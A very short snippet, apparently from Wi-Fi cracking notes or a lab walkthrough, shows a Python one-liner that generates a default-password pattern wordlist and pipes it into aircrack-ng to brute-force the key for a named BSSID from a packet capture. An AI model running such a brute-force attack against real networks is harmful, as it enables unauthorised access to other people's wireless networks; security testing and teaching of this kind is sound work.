To bruteforce the second half of the selected BSSID (1):
❯ python3 -c 'print("\n".join(f"Acme{i:06d}" for i in range(1000000)))' | aircrack-ng -w - -b 00:1A:1E:C1:76:50 capture-7.pcap

  
